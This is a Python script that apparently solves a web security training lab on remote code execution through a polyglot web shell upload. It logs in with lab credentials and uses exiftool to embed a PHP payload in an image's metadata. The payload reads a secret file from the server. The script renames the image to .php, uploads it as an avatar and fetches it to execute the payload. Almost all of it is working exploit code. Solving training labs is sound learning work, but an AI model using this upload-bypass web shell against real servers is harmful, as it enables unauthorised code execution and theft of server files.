#######################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 13/10/2023
#
# Lab: Remote code execution via polyglot web shell upload
#
# Steps: 1. fetch the login page
#        2. Extract the csrf token and session cookie
#        3. Login as wiener
#        4. Fetch wiener profile
#        5. Embed the payload in the image using exiftool
#        6. Change the extension of the image to .php
#        7. Read the image with embedded payload
#        8. Upload the image with the embedded payload
#        9. Fetch the uploaded image with the embedded payload to read the secret
#        10. Submit the solution
#
#######################################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore
import os


###########
# Main
###########

# change this to your lab URL
url = "https://0a24005803efadb9802021f600cd002b.web-security-academy.net"

try:  
    # fetch the login page
    login_page = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = login_page.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as wiener
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)


print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:  
    # fetch wiener profile
    wiener = requests.get(f"{url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener profile through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Fetching wiener profile.. " + Fore.GREEN + "OK")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", wiener.text)[0]

# image name
# make sure that there is an image with this name in the root directory
image_name = "white.jpg"

# the final image name with the embedded payload
# you can change this to what you want
image_with_payload_name = "hack.php"

# payload to embed in the image
payload = """<br><h1><?php echo 'Secret: ' . file_get_contents('/home/carlos/secret'); __halt_compiler(); ?></h1>"""

# embed the payload in the image using exiftool
os.system(f"""exiftool -DocumentName="<br><h1><?php echo 'Secret: ' . file_get_contents('/home/carlos/secret'); __halt_compiler(); ?></h1>" {image_name}""")

print(Fore.WHITE + "⦗5⦘ Embedding the payload in the image using exiftool.. " + Fore.GREEN + "OK")

# change the extension of the image to .php
# if you are still a windows user, changing 'mv' to 'move' should make the script still work
os.system(f"mv {image_name} {image_with_payload_name}")

print(Fore.WHITE + "⦗6⦘ Changing the extension of the image to .php.. " + Fore.GREEN + "OK")

# read the image with the embedded paylaod
image_with_payload = open(image_with_payload_name, 'rb').read()

print(Fore.WHITE + "⦗7⦘ Reading the image with embedded payload.. " + Fore.GREEN + "OK")

# set the avatar
files = {
    "avatar": (image_with_payload_name, image_with_payload, "application/x-php")
}

# set the other data to send with the avatar
data = {
    "user": "wiener",
    "csrf": csrf 
}

try:  
    # upload the image with the embedded payload
    requests.post(f"{url}/my-account/avatar", data, files=files, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to upload the the image with the embedded payload through exception")
    exit(1)

print(Fore.WHITE + "⦗8⦘ Uploading the image with the embedded payload.. " + Fore.GREEN + "OK")

try:
    # fetch the uploaded image with the embedded payload
    uploaded_image = requests.get(f"{url}/files/avatars/{image_with_payload_name}", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch the uploaded image with the embedded payload through exception")
    exit(1)

print(Fore.WHITE + "⦗9⦘ Fetching the uploaded image with the embedded payload to read the secret.. " + Fore.GREEN + "OK")

# extract carlos secret
secret = re.findall("Secret: (.*)", uploaded_image.text)[0]

print(Fore.BLUE + "❯ Secret: " + Fore.YELLOW + secret)

# set answer
data = {
    "answer": secret
}

try:
    # submit the solution
    requests.post(f"{url}/submitSolution", data)

except:
    print(Fore.RED + "[!] Failed to submit the solution through exception")
    exit(1)

print(Fore.WHITE + "⦗10⦘ Submitting the solution.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

# change the image extension back to its original one
# if you are still a windows user, changing 'mv' to 'move' should make the script still work
os.system(f"mv {image_with_payload_name} {image_name}")

print(Fore.WHITE + "❯ Changing the image extension back to its original one.. " + Fore.GREEN + "OK")


